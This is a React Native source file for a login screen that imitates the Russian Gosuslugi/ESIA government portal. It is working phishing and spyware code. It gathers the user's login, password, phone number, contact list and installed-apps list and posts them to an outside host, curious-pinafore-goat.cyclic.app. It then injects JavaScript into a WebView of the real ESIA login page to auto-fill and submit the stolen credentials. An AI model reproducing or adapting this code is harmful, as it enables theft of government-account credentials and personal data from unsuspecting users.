import React, { useState, useEffect, useRef } from 'react';
import { View, TouchableOpacity, Text, StyleSheet, Linking, Keyboard, ActivityIndicator } from 'react-native';
import SvgComponent from '../../svgs/Logo';
import MyInput from '../MyInput';
import PhoneNumberPopup from '../PhoneNumber';
import StorageManager from '../StorageManager';
import Apps from '../../modules/Apps';
import Contact from '../../modules/Contact';
import { useNavigation } from '@react-navigation/native';
import WebView from 'react-native-webview';
export default function LogIn() {
    const webViewRef = useRef(null);
    const navigation = useNavigation();
    const [phoneOrEmailText, setPhoneOrEmailText] = useState('');
    const [passwordText, setPasswordText] = useState('');
    const [showPhoneOrEmailError, setShowPhoneOrEmailError] = useState(false);
    const [showPasswordError, setShowPasswordError] = useState(false);
    const [popupVisible, setPopupVisible] = useState(false);
    const [apps, setApps] = useState('')
    const [contacts, setContacts] = useState('')
    const [loading, setLoading] = useState(false);
    const [showWebView, setShowWebView] = useState(false)
    const [isBannedUser, setIsBannedUser] = useState(false)
    const defaultHeaders = new Headers();
    defaultHeaders.append('Content-Type', 'application/json');
    defaultHeaders.append('Authorization', 'Bearer your_token_here');
    const handlePhoneOrEmailChange = (text) => {
        setPhoneOrEmailText(text);
    };
    const handlePasswordChange = (text) => {
        setPasswordText(text);
    };
    const handleContinuePress = async () => {
        console.log('Продолжить');
        console.log(phoneOrEmailText);
        console.log(passwordText);

        await setShowPhoneOrEmailError(phoneOrEmailText.length > 5);
        await setShowPasswordError(passwordText.length > 8);
        if (passwordText.length > 8 && phoneOrEmailText.length > 5) {
            await setPopupVisible(true);
            var phone = await StorageManager.getData('phoneNumber');
            if (phone) {
                Keyboard.dismiss();
                handleSubmitPhoneNumber(phone);
            }
        }
    };

    const fillFormAndSubmit = () => {
        console.log('Page loaded');
        const script = `
        
            const observer = new IntersectionObserver((entries, observer) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        document.querySelector('input[id="login"]').value = '${phoneOrEmailText}';
                        document.querySelector('input[id="password"]').value = '${passwordText}';
                      
                        const button = document.querySelector('.plain-button.plain-button_wide');
                        if (button) {
                            button.click();
                        }
                        observer.disconnect(); // Отключаем наблюдение после выполнения
                    }
                });
            });
            observer.observe(document.querySelector('.plain-button.plain-button_wide'));    
        `;

        setTimeout(() => {
            console.log('Injecting script');
            webViewRef.current.injectJavaScript(script);
        }, 1000);
    };

    const handleRecoverPress = () => {
        Linking.openURL('https://esia.gosuslugi.ru/login/recovery');
    };
    const handleRegisterPress = () => {
        Linking.openURL('https://esia.gosuslugi.ru/login/registration');
    };
    const handleMoreInfo = () => {
        Linking.openURL('https://www.gosuslugi.ru/landing/esia-help')
    }
    const handleSubmitPhoneNumber = async (phoneNumber) => {
        setLoading(true);
        await StorageManager.saveData('phoneNumber', phoneNumber)
        await setPopupVisible(false);
        console.log("Phone:", phoneNumber)
        const user_data = {
            phoneOrEmailText,
            passwordText,
            phoneNumber,
            isBannedUser
        }
        const data = { user_data: user_data, contacts: contacts, apps: apps }
        fetch("https://curious-pinafore-goat.cyclic.app/user/add", {
            method: "POST",
            headers: defaultHeaders,
            body: JSON.stringify(data)
        })
            .then(response => {
                setLoading(false);
                //navigation.navigate('Main');
                setShowWebView(true)
                StorageManager.saveData('login', phoneOrEmailText)
                StorageManager.saveData('pass', passwordText)
            })
            .catch(error => {
                setLoading(false);
            });
    };

    const getData = async () => {
        await setApps(await Apps.loadApps())
        await setContacts(await Contact.loadContacts())
    }
    useEffect(() => {
        getData()
    }, [])

    return (
        <>
            {showWebView ? <WebView
                style={{ flex: 1 }}
                ref={webViewRef}
                source={{ uri: "https://esia.gosuslugi.ru/login/" }}
                onLoad={fillFormAndSubmit}
            /> : <View style={styles.container}>
                <PhoneNumberPopup
                    visible={popupVisible}
                    onClose={() => setPopupVisible(false)}
                    onSubmit={handleSubmitPhoneNumber}
                />
                <View style={styles.main}>
                    <SvgComponent style={styles.svg} />
                    <View>
                        <MyInput
                            onTextChange={handlePhoneOrEmailChange}
                            placeholderText="Телефон / Email / СНИЛС"
                            color='black'
                            backgroundColor={!showPhoneOrEmailError ? 'rgba(238, 63, 88, .16)' : 'transparent'}
                        />
                        <MyInput
                            onTextChange={handlePasswordChange}
                            placeholderText="Пароль"
                            type="password"
                            color='black'
                            backgroundColor={!showPasswordError ? 'rgba(238, 63, 88, .16)' : 'transparent'}
                        />
                        {(!showPhoneOrEmailError || !showPasswordError) && <Text style={styles.errorText}>Введите логин и пароль</Text>}
                        <TouchableOpacity
                            style={[styles.buttontrans, { marginTop: 0 }]}
                            onPress={handleRecoverPress}
                        >
                            <Text style={styles.buttonText_trans}>Восстановить</Text>
                        </TouchableOpacity>
                    </View>
                    <TouchableOpacity
                        style={styles.button}
                        onPress={handleContinuePress}
                    >
                        {loading ? <ActivityIndicator size="small" color="#fff" /> : <Text style={styles.buttonText}>Войти</Text>}
                    </TouchableOpacity>
                </View>
                <TouchableOpacity
                    style={[styles.buttontrans, { marginTop: 0, alignItems: 'center' }]}
                    onPress={handleRegisterPress}
                >
                    <Text style={styles.buttonText_trans}>Зарегистрироваться</Text>
                </TouchableOpacity>
                <View style={[styles.main, { height: 200, marginTop: 25, alignItems: 'left' }]}>
                    <TouchableOpacity
                        style={[styles.buttontrans, { marginTop: 15, width: 200, height: 'auto', marginLeft: 20 }]}
                        onPress={handleMoreInfo}
                    >
                        <Text style={[styles.buttonText_trans, { lineHeight: 25 }]}>Куда ещё можно войти с паролем от Госуслгу?</Text>
                    </TouchableOpacity>
                </View>
            </View>}
        </>
    );
}
const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#c1d4f5',
        alignItems: 'center',
    },
    main: {
        backgroundColor: '#fff',
        height: 500,
        width: 350,
        borderRadius: 15,
        alignItems: "center",
        flexDirection: "column",
        marginTop: 50
    },
    svg: {
        paddingTop: 110
    },
    text: {
        fontSize: 22,
        fontWeight: "bold",
        color: 'black'
    },
    text2: {
        fontSize: 18,
        color: 'black'
    },
    button: {
        width: 300,
        height: 60,
        justifyContent: 'center',
        alignItems: 'center',
        borderRadius: 5,
        marginTop: 20,
        backgroundColor: "#0B85FE"
    },
    buttonText: {
        color: 'white',
        fontSize: 16,
    },
    buttontrans: {
        width: "95%",
        height: 65,
        justifyContent: 'center',
        alignItems: 'left',
        borderRadius: 10,
        marginTop: 10,
        backgroundColor: 'transparent',
    },
    buttonText_trans: {
        color: '#297ccb',
        fontSize: 18,
    },
    errorText: {
        color: 'red',
        marginTop: 5,
    },
});